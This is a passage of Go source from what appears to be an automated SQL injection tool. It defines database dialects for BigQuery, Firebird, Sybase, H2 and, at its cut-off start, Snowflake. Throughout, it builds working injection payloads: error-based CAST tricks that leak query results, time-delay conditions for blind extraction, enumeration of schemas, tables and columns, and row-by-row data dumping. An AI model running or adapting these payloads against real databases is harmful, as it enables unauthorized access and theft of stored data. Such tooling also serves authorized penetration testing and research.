			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.PUBLIC.%s)", quoteDouble(db), quoteDouble(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(TO_VARCHAR(%s),'NULL')", quoteDouble(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.PUBLIC.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteDouble(db), quoteDouble(table), offset)
		},
		FileRead: func(path string) (string, bool) {
			return "", false
		},
		OSCmd: func(cmd string) (string, bool) {
			return "", false
		},
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_name) FROM information_schema.tables WHERE table_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(column_name,CHAR(30)) WITHIN GROUP (ORDER BY column_name) FROM information_schema.columns WHERE column_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(column_name||':'||data_type,CHAR(30)) WITHIN GROUP (ORDER BY ordinal_position) FROM %s.information_schema.columns WHERE table_name=%s)", quoteDouble(db), literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(table_schema||'.'||table_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name) FROM information_schema.tables)"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(table_schema||'.'||table_name||'.'||column_name,CHAR(30)) WITHIN GROUP (ORDER BY table_schema,table_name,column_name) FROM information_schema.columns)"
		},
	}
}

func bigqueryDialect() *Dialect {
	return &Dialect{
		Name:          "BigQuery",
		Aliases:       defaultAliases("BigQuery", "BQ"),
		Quote:         quoteBacktick,
		Str:           literal,
		Concat:        concatFunc("CONCAT"),
		Length:        func(e string) string { return "LENGTH(" + e + ")" },
		Substr:        func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
		ASCII:         func(e string) string { return "ASCII(" + e + ")" },
		Marker:        markerFunc,
		SleepExpr:     func(n int) string { return "0" },
		TimeCondition: func(cond string, n int) string { return "1" },
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT64)", expr), true
		},
		Databases: func() string {
			return "(SELECT STRING_AGG(schema_name,chr(30)) FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(table_name,chr(30)) FROM %s.INFORMATION_SCHEMA.TABLES)", quoteBacktick(db))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(column_name,chr(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
		},
		CurrentDB:  func() string { return "@@project_id" },
		Version:    func() string { return "@@version" },
		User:       func() string { return "SESSION_USER()" },
		Hostname:   func() string { return "'bigquery'" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteBacktick(db), quoteBacktick(table))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS STRING),'NULL')", quoteBacktick(c)))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteBacktick(db), quoteBacktick(table), offset)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(table_name,chr(30)) FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE %s)", literal("%"+keyword+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(column_name,chr(30)) FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE %s)", literal("%"+keyword+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT STRING_AGG(CONCAT(column_name,':',data_type),chr(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
		},
		AllTables: func() string {
			return "(SELECT STRING_AGG(table_name,chr(30)) FROM INFORMATION_SCHEMA.TABLES)"
		},
		AllColumns: func() string {
			return "(SELECT STRING_AGG(column_name,chr(30)) FROM INFORMATION_SCHEMA.COLUMNS)"
		},
	}
}

func firebirdDialect() *Dialect {
	return &Dialect{
		Name:    "Firebird",
		Aliases: defaultAliases("Firebird", "InterBase"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatPipe,
		Length:  func(e string) string { return "CHAR_LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s FROM %d FOR %d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII_VAL(" + e + ")" },
		Marker:  markerPipe,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3)")
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM rdb$database r1,rdb$database r2,rdb$database r3) ELSE 1 END", cond)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INTEGER)", expr), true
		},
		Databases: func() string {
			return "(SELECT LIST(rdb$database_name,',') FROM rdb$databases)"
		},
		Tables: func(db string) string {
			return "(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$system_flag=0)"
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
		},
		CurrentDB:  func() string { return "CURRENT_DATABASE" },
		Version:    func() string { return "rdb$get_context('SYSTEM','ENGINE_VERSION')" },
		User:       func() string { return "CURRENT_USER" },
		Hostname:   func() string { return "CURRENT_HOST" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(strings.ToUpper(table)))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(4000)),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT %s FROM %s ROWS %d TO %d)", strings.Join(parts, "||'|'||"), quoteDouble(strings.ToUpper(table)), offset+1, offset+1)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$relation_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$field_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$system_flag=0)"
		},
		AllColumns: func() string {
			return "(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields)"
		},
	}
}

func sybaseDialect() *Dialect {
	d := mssqlDialect()
	d.Name = "Sybase"
	d.Aliases = defaultAliases("Sybase", "SQLAnywhere")
	d.Version = func() string { return "@@VERSION" }
	d.Databases = func() string { return "(SELECT LIST(name,',') FROM sysdatabases)" }
	d.Tables = func(db string) string {
		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..sysobjects WHERE type='U')", quoteBracket(db))
	}
	d.Columns = func(db, table string) string {
		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..syscolumns WHERE id=OBJECT_ID(%s))", quoteBracket(db), literal(db+".."+table))
	}
	return d
}

func h2Dialect() *Dialect {
	return &Dialect{
		Name:    "H2",
		Aliases: defaultAliases("H2"),
		Quote:   quoteDouble,
		Str:     literal,
		Concat:  concatFunc("CONCAT"),
		Length:  func(e string) string { return "LENGTH(" + e + ")" },
		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTRING(%s,%d,%d)", e, p, l) },
		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
		Marker:  markerFunc,
		SleepExpr: func(n int) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM SYSTEM_RANGE(1,100000000))")
		},
		TimeCondition: func(cond string, n int) string {
			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM SYSTEM_RANGE(1,100000000)) ELSE 1 END", cond)
		},
		ErrorExpr: func(expr string) (string, bool) {
			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
		},
		Databases: func() string {
			return "(SELECT LISTAGG(SCHEMA_NAME,CHAR(30)) WITHIN GROUP (ORDER BY SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA)"
		},
		Tables: func(db string) string {
			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=%s)", literal(strings.ToUpper(db)))
		},
		Columns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
		},
		CurrentDB:  func() string { return "DATABASE()" },
		Version:    func() string { return "H2VERSION()" },
		User:       func() string { return "CURRENT_USER" },
		Hostname:   func() string { return "'localhost'" },
		IsDBA:      func() string { return "1" },
		Privileges: func() string { return "''" },
		Users:      func() string { return "''" },
		Passwords:  func() string { return "''" },
		Roles:      func() string { return "''" },
		RowCount: func(db, table string) string {
			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)))
		},
		DumpRow: func(db, table string, cols []string, offset int) string {
			parts := make([]string, 0, len(cols))
			for _, c := range cols {
				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(strings.ToUpper(c))))
			}
			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)), offset)
		},
		FileRead: func(path string) (string, bool) { return "", false },
		OSCmd:    func(cmd string) (string, bool) { return "", false },
		SearchTables: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		SearchColumns: func(keyword string) string {
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
		},
		TableColumns: func(db, table string) string {
			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME||':'||DATA_TYPE,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
		},
		AllTables: func() string {
			return "(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES)"
		},
		AllColumns: func() string {
			return "(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS)"
		},
	}
}
